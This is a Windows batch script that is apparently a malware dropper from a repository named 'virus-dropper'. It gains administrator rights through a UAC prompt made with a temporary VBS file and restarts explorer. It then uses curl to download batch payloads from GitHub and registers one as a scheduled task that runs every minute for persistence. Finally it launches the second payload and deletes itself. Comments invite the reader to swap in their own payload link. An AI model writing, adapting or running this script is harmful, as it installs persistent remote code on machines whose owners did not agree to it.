@echo off
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    taskkill /f /im "explorer.exe"
    start explorer.exe
    md %appdata%\Windows
    curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/InstallPERSISTENT.bat" --output "%appdata%\Windows\Install.bat"
    SCHTASKS /CREATE /F /SC MINUTE /TR "%appdata%\Windows\Install.bat" /TN "Install.bat"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"



::Create a copy of install.bat, and edit items inside as directed
::Edit this link to the DIRECT download link of the new install.bat
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
::do not change --output

del /f "%appdata%\Windows\Install.bat"
rd %appdata%\Windows
e

start /min Install.bat
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit
